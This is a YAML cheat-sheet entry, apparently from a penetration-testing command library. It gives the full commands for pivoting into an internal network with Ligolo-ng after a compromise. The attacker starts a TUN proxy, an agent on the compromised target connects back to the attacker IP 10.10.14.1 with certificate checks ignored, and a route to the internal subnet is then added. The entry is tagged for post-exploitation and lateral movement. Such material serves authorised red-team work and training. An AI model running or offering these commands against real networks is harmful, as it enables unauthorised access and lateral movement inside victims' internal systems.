---
description: |
  Create a reverse tunnel for pivoting into an internal network
  using Ligolo-ng. No SSH needed.

  Reference values:
    Attacker IP: 10.10.14.1
    Internal Subnet: 172.16.1.0/24
command: |
  # On attacker — start proxy
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert -laddr 0.0.0.0:443

  # On target — connect agent
  ./agent -connect 10.10.14.1:443 -ignore-cert

  # On attacker — add route after session starts
  sudo ip route add 172.16.1.0/24 dev ligolo
phase:
  - Post-Exploitation
  - Lateral_Movement
target_os:
  - Linux
  - Windows
services: []
ports: []
items:
  - Shell
techniques:
  - Pivoting
  - Tunneling
network_position:
  - Internal
references:
  - https://github.com/nicocha30/ligolo-ng
---
